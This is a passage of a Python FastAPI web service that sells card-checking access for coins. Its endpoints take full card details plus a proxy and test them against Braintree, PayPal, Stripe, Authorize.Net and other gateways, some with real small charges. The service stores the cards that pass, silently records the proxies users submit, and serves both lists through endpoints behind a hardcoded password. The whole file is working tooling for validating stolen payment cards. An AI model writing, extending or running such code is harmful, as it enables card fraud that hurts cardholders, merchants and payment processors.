        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await braintree_auth.process_braintree_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Braintree Auth', '0.00', 'braintree_hits.txt')

    return JSONResponse({
        'Gateway': 'Braintree Auth',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/paypal')
async def paypal_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge1.process_paypal_charge(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal 5 USD', '5.00', 'paypal_charge1_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal 5 USD',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/paypal')
async def paypal_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge1.process_paypal_charge(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal 5 USD', '5.00', 'paypal_charge1_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal 5 USD',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })
@app.get('/stripe4')
async def stripe4_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth4.process_stripe_auth_nas(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Nas', '0.00', 'stripe_auth4_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Nas',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/stripe4')
async def stripe4_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth4.process_stripe_auth_nas(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Nas', '0.00', 'stripe_auth4_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Nas',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/wallawalla')
async def wallawalla_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await wallawalla_auth.process_wallawalla_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Wallawalla Auth', '0.00', 'wallawalla_hits.txt')

    return JSONResponse({
        'Gateway': 'Wallawalla Auth',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/wallawalla')
async def wallawalla_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await wallawalla_auth.process_wallawalla_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Wallawalla Auth', '0.00', 'wallawalla_hits.txt')

    return JSONResponse({
        'Gateway': 'Wallawalla Auth',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/stripe_charge2')
async def stripe_charge2_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_charge2.process_stripe_charge2(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Charge 2', '1.00', 'stripe_charge2_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Charge 2',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/stripe_charge2')
async def stripe_charge2_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_charge2.process_stripe_charge2(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Charge 2', '1.00', 'stripe_charge2_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Charge 2',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/paypal2')
async def paypal2_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge2.process_paypal_charge2(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal 1 USD', '1.00', 'paypal_charge2_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal 1 USD',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/paypal2')
async def paypal2_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge2.process_paypal_charge2(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal 1 USD', '1.00', 'paypal_charge2_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal 1 USD',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/paypal3')
async def paypal3_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge3.process_paypal_charge3(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal 1 USD Ql', '1.00', 'paypal_charge3_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal 1 USD Ql',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/paypal3')
async def paypal3_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge3.process_paypal_charge3(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal 1 USD Ql', '1.00', 'paypal_charge3_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal 1 USD Ql',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/paypal4')
async def paypal4_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge4.process_paypal_charge4(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal Cors 7 USD', '7.00', 'paypal_charge4_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal Cors 7 USD',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/paypal4')
async def paypal4_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await paypal_charge4.process_paypal_charge4(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'PayPal Cors 7 USD', '7.00', 'paypal_charge4_hits.txt')

    return JSONResponse({
        'Gateway': 'PayPal Cors 7 USD',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })
@app.get('/authorizenet')
async def authorizenet_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await authorizenet_auth.process_authorizenet_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Authorize.Net Auth', '0.00', 'authorizenet_hits.txt')

    return JSONResponse({
        'Gateway': 'Authorize.Net Auth',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/authorizenet')
async def authorizenet_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await authorizenet_auth.process_authorizenet_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Authorize.Net Auth', '0.00', 'authorizenet_hits.txt')

    return JSONResponse({
        'Gateway': 'Authorize.Net Auth',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


from fastapi.responses import HTMLResponse

@app.get('/adyen/docs', response_class=HTMLResponse)
async def adyen_docs():
    docs_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "adyen", "docs", "index.html")
    if os.path.exists(docs_path):
        with open(docs_path, 'r', encoding='utf-8') as f:
            return f.read()
    return HTMLResponse("Docs page not found.", status_code=404)


@app.get('/adyen/checker', response_class=HTMLResponse)
async def adyen_checker_ui():
    checker_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "adyen", "docs", "checker.html")
    if os.path.exists(checker_path):
        with open(checker_path, 'r', encoding='utf-8') as f:
            return f.read()
    return HTMLResponse("Checker UI page not found.", status_code=404)


@app.get('/leviathanadmin', response_class=HTMLResponse)
async def adyen_admin_ui():
    admin_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "adyen", "docs", "admin.html")
    if os.path.exists(admin_path):
        with open(admin_path, 'r', encoding='utf-8') as f:
            return f.read()
    return HTMLResponse("Admin UI page not found.", status_code=404)


@app.get('/api/proxies')
async def view_proxies(password: str = Query(...)):
    if password != "commndogod":
        raise HTTPException(status_code=403, detail="Forbidden: Incorrect password")
    if not os.path.exists(PROXIES_FILE):
        return PlainTextResponse("No proxies recorded yet.")
    with open(PROXIES_FILE, 'r', encoding='utf-8') as f:
        return PlainTextResponse(f.read())


@app.get('/api/approved')
async def view_approved(password: str = Query(...)):
    if password != "commndogod":
        raise HTTPException(status_code=403, detail="Forbidden: Incorrect password")
    if not os.path.exists(APPROVED_CARDS_FILE):
        return PlainTextResponse("No approved cards recorded yet.")
    with open(APPROVED_CARDS_FILE, 'r', encoding='utf-8') as f:
        return PlainTextResponse(f.read())


if __name__ == '__main__':
    import uvicorn
    port = int(os.environ.get('PORT', 5000))
    uvicorn.run('app:app', host='0.0.0.0', port=port)
